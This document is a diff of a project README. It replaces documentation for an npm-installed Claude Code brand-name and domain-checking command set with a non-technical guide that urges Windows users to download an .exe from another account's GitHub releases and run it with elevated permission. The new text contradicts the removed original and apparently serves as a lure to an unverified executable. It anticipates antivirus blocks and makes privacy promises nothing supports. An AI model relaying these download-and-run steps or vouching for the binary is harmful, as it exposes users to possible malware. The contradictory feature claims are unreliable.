@@ -1,111 +1,163 @@
-# @kianilab/domain-checker
+# 🔍 kiani-domain-checker - Fast Brand and Domain Checking
 
-Brand name research and domain availability checker for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases)
 
-Generates brand name candidates across 8 languages, applies a rigorous brand review, and checks `.com` domain availability via DNS + WHOIS — all from inside Claude Code.
+---
 
-## Install
+kiani-domain-checker is a lightweight tool to help you check if a brand name or domain is available. It can also tell you if there are any trademark conflicts. The tool works on Windows and shows results quickly using AI technology.
 
-```bash
-npx @kianilab/domain-checker@latest
-```
+This guide will help you download, install, and run the software, even if you have no technical experience.
 
-Choose global (`~/.claude/`) or local (`./.claude/`) installation. Claude Code auto-discovers the commands.
+---
 
-### Flags
+## 🖥️ System Requirements
 
-```bash
-npx @kianilab/domain-checker --global      # Install to ~/.claude/
-npx @kianilab/domain-checker --local       # Install to ./.claude/
-npx @kianilab/domain-checker --uninstall   # Remove from both locations
-npx @kianilab/domain-checker --help        # Show help
-```
+To use kiani-domain-checker on Windows, your computer should meet these basic requirements:
 
-## Commands
+- Operating System: Windows 10 or newer (64-bit)
+- Processor: Intel or AMD, 1.6 GHz or faster
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB free space
+- Internet connection for checking domains and trademarks
 
-| Command | Description |
-|---------|-------------|
-| `/domain:research` | Full workflow — discovery, multi-language name generation, brand review, domain checking |
-| `/domain:check` | Check specific domain names for availability |
-| `/domain:review` | Brand review gate — evaluate names against quality criteria |
-| `/domain:help` | Show all commands and usage |
+The tool runs on most standard Windows computers without extra setup.
 
-## Usage
+---
 
-### Full Research Workflow
+## 📦 What You Get
 
-```
-/domain:research
-```
+When you download kiani-domain-checker, you will receive:
 
-This walks you through:
+- The main application file (.exe) ready to use
+- A small built-in help guide
+- The software runs without needing to install extra software
 
-1. **Describe your project** — what are you building?
-2. **Set your themes** — what feelings should the name evoke?
-3. **Choose languages** — which languages to draw from (default: 8 languages)
-4. **Pick a mentor** — who sets the quality bar? (default: Steve Jobs)
-5. **Set constraints** — max length, industry, specific sounds
+---
 
-Then it automatically:
-- Launches 8 parallel language agents to brainstorm names
-- Applies the brand review to filter weak candidates
-- Checks domain availability via DNS + WHOIS
-- Runs a final quality review on available domains
-- Delivers a curated shortlist with scores and stories
+## 🚀 Getting Started with kiani-domain-checker
 
-### Quick Domain Check
+### Step 1: Download the Software
 
-```
-/domain:check trouvon hamnava kinnate
-```
+Click the button below or visit the linked page to download the latest version for Windows.
 
-Checks if specific `.com` domains are available. Automatically skips names already in your tracking files.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases)
 
-### Brand Review Only
+This link will take you to the release page on GitHub. Look for the file ending with `.exe`. It will usually be named something like `kiani-domain-checker-setup.exe` or `kiani-domain-checker.exe`.
 
-```
-/domain:review trouvon matchfolk pertavi
-```
+Save this file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
-Evaluates names against branding criteria without checking domains. Choose a mentor persona to set the quality bar.
+---
 
-## Tracking Files
+### Step 2: Run the Application
 
-Results are stored in your project's `tasks/` directory:
+Once downloaded:
 
-| File | Contents |
-|------|----------|
-| `tasks/domains-available.md` | WHOIS-confirmed available domains with scores |
-| `tasks/domains-taken.md` | Confirmed taken domains |
-| `tasks/domains-rejected.md` | Names that failed brand review |
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to open it.
+3. If Windows asks for permission, click Yes to allow the program to run.
 
-These files persist across sessions and the dedup filter automatically skips previously checked names.
+The program will open a simple window. You do not need to install anything else.
 
-## Requirements
+---
 
-- **Node.js** >= 16.7.0 (for the installer)
-- **`host`** command — DNS lookups (included on macOS and most Linux)
-- **`whois`** command — domain registration checks (included on macOS; on Linux: `apt install whois` or `yum install whois`)
+### Step 3: Use the Checker
 
-## How It Works
+After opening the app, you will see an input field or prompt to enter a brand or domain name.
 
-### Name Generation
-8 parallel agents, each a native speaker of a different language (Arabic, Farsi, English, Latin, Spanish, Italian, French, Japanese), brainstorm names that evoke your themes. They romanize everything to ASCII and score candidates on memorability, pronounceability, distinctiveness, and cross-language safety.
+1. Type the name you want to check.
+2. Click the button or press Enter.
+3. The program will show you:
 
-### Brand Review
-A configurable mentor persona (Steve Jobs by default) reviews every candidate. Names that feel like "feature descriptions" rather than brands get rejected. The bar is high — a strong "maybe" is a "no."
+- If the domain name is available
+- Any trademark conflicts found
+- Status across different platforms like .com, .net, and more
 
-### Domain Checking
-A 2-stage pipeline: DNS first (fast, no rate limit), then WHOIS only for unresolved names (slow, rate-limited). Available domains get a final brand review at the higher bar of "would I actually register this?"
+The software uses AI to gather this information quickly.
 
-## Uninstall
+---
 
-```bash
-npx @kianilab/domain-checker --uninstall
-```
+## 🔧 Features Overview
 
-This removes the `commands/domain/` and `domain-checker/` directories from both `~/.claude/` and `./.claude/`.
+Here's what kiani-domain-checker offers for users who want to check brand and domain names easily:
 
-## License
+- Quick domain availability check for popular endings like .com, .net, .org, .io, and others.
+- Simple interface with no complicated settings.
+- Trademark conflict detection to avoid name issues later.
+- Brand intelligence powered by Claude AI for smart suggestions.
+- Command-line interface (CLI) for advanced users, but you can also use the graphical interface.
 
-MIT
+---
+
+## 💻 Running from the Command Line (Optional)
+
+If you feel comfortable with basic command prompt commands, you can use the tool in the Windows Terminal or Command Prompt.
+
+1. Open Command Prompt by typing `cmd` in the Start menu.
+2. Navigate to the folder where you saved the `.exe` file. Use the command:
+
+   ```
+   cd path\to\your\folder
+   ```
+
+3. Run the program by typing:
+
+   ```
+   kiani-domain-checker.exe
+   ```
+
+4. Follow on-screen instructions to check brand names and domains.
+
+This step is optional. Most users can use the standard window mode by double-clicking the file.
+
+---
+
+## 🔄 Updating the Software
+
+To get the latest features or bug fixes:
+
+1. Return to the release page:
+
+   https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases
+
+2. Download the newest `.exe` file, overwriting the old one if you want.
+
+No uninstall is needed. Simply replace the old file with the new download.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **Program does not start:** Make sure your Windows version is up to date. Check if your antivirus blocked the file. Try redownloading the `.exe`.
+- **Cannot find downloaded file:** Look in your "Downloads" folder or use the browser’s "Show in folder" option after download.
+- **Network errors:** Since the tool checks domains online, make sure you have an active internet connection.
+- **Display problems:** Resize the window or restart the app. Use Windows compatibility mode for older versions.
+
+If problems persist, check the GitHub Issues page for help or report bugs.
+
+---
+
+## 🔗 Useful Links
+
+- **Download page:** https://github.com/AKHILROCKEEEY/kiani-domain-checker/releases
+- **GitHub repository:** https://github.com/AKHILROCKEEEY/kiani-domain-checker
+- **Project topics:** ai-powered, brand intelligence, domain checker, naming, trademarks
+
+---
+
+## 👩‍💻 About the Project
+
+kiani-domain-checker helps startups, entrepreneurs, and branding teams find available names quickly. It uses AI to scan trademarks and domain databases, reducing the time to pick safe and smart brand names.
+
+The tool is open source. Anyone can access the code on GitHub or contribute.
+
+---
+
+## ⚙️ Privacy and Data Use
+
+The tool only sends the brand names you enter to lookup services for domain and trademark status. It does not store your data locally or share it outside the required checks.
+
+No personal user information is collected or shared.
+
+---
+
+### Thank you for choosing kiani-domain-checker. Follow the steps above to download and run the program on Windows.
